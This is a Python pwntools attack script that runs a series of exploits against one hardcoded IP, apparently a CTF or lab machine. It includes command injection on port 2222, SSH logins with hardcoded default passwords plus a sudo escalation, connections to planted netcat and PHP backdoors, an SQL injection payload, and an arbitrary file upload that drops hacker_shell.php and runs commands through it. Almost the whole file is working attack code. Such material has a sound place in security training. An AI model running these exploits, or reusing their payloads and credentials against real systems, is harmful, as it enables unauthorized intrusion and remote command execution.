#!/usr/bin/python

from pwn import *
import re
import requests

class exploit_vulns():
    def exploit_cmd_injection(self, ip, cmd):
        """
        Exploit command injection on port 2222
        @param ip: ip address of target
        @param cmd: command
        """
        try:
            conn = remote(ip, 2222)
            prompt = conn.recv()
            log.debug(prompt)
            conn.send("ls;"+cmd+"\n")
            results = conn.recv()
        except:
            log.info("Error connecting to "+ ip)
            return None
        log.debug(results)
        conn.close()

    def exploit_ssh_default(self, ip, username, pw, cmd):
        """
        @param ip: ip address of target
        @param username: ssh username
        @oaram pw: password
        """
        try:
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell[cmd]
        except:
            log.info("Failed to connect to ssh " + ip)
            return None
        log.debug(results)
        shell.close()

    def exploit_backdoor_1(self, ip, cmd):
        """
        Exploit netcat backdoor. Default backdoor is on port 33123
        but the backdoor port will decrement after each successful connection
        @param ip: ip address of target
        """
        results = ""
        for i in range(33123, 33083, -1):
            port = i
            try:
                conn = remote(ip, port)
                if conn:
                    conn.send(cmd + "\n")
                    results = conn.recv()
                    log.debug(results)
                    conn.close()
            except:
                pass
            if results:
                return True

    def exploit_backdoor_2(self, ip, cmd):
        """
        Exploit the php backdoor that was left on the machine in the images folder
        @param ip: ip address of target
        """
        url = "http://" + ip + "/arbitrary_file_upload/images/shell.php?cmd=" + cmd
        results = ""
        try:
            results = wget(url)
            log.debug(results)
        except:
            log.info("Error connecting to backdoor 2 " + ip)
            return None

    def exploit_sqli(self, ip, command):
        """
        Test for SQL injection (SQLi)
        @param  ip: ip address of target
        """
        log.debug("testing sqli on " + ip)
        results = ""
        #payload = {'codename_input':'B-Rabbit', 'submitted':'TRUE'}
        #create SQL injection payload
        payload = {'codename_input':'a" or 2 LIKE 2-- ', 'submitted':'TRUE'}
        url = "http://" + ip + "/index.php"
        try:
            results = requests.post(url, data=payload)
            log.debug(results.text)
        except: 
            log.info("Failed to connect to sqli " + ip) 
            return None 
        
    def exploit_arbitrary_file_upload(self, ip, cmd):
        """
        Exploit for arbitrary file upload. This function requires the existance of a local file called hacker_shell.php
        @param ip: ip address of target
        """
        results = ""
        url = "http://" + ip + "/arbitrary_file_upload/upload.php"
        try:
            hacker_shell = open('hacker_shell.php', 'rb')
        except:
            log.info("Falied to open local file on server. Make sure hacker_shell.php is in current working directory")
            return None
        files = {'image': hacker_shell}
        try: 
            results = requests.post(url, files=files)
        except:
            log.info("Failed to connect to " + ip)
            return None
        url2 = "http://" + ip + "/arbitrary_file_upload/images/hacker_shell.php?cmd=" + cmd
        try:
            results2 = requests.get(url2)
        except:
            return None 
        log.debug(results2.text)

    def exploit_ssh_jackbauer(self, ip, cmd):
        return self.exploit_ssh_default(ip, "jackbauer", "devgru6", cmd)

    def exploit_ssh_chloe(self, ip, cmd):
        return self.exploit_ssh_default(ip, "chloe", "chloechloe", cmd)

    def exploit_ssh_surnow(self, ip, cmd):
        username = "surnow"
        pw = "surnowsurnow"
        cmd1 = "sudo su\n"
        cmd2 = "su jackbauer"
        cmd3 = "exit"
        try:
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell.run(cmd1)
            _ = results.receiveuntil("password for surnow:")
            shell.sendline(pw)
            shell.sendline(cmd2)
            shell.sendline(cmd)
            shell.sendline(cmd3)
            shell.sendline(cmd3)
            
        except:
            log.info("Failed to connect to ssh " + ip)
            return None
        log.debug(results)
        shell.close()


if __name__ == "__main__":
    ip_addr = "192.168.3.117"
    t = exploit_vulns()
    context.log_level = "debug"
    command = "zenity --info --text='better hurry. the digital bomb is about to explode' >/dev/null 2>&1 &"
    t.exploit_arbitrary_file_upload(ip_addr, command)
    #t.exploit_sqli(ip_addr, command)
    t.exploit_cmd_injection(ip_addr, command)
    t.exploit_ssh_jackbauer(ip_addr, command)
    #t.exploit_ssh_chloe(ip_addr, command)
    t.exploit_ssh_surnow(ip_addr, command)
    t.exploit_backdoor_1(ip_addr, command)
    t.exploit_backdoor_2(ip_addr, command)


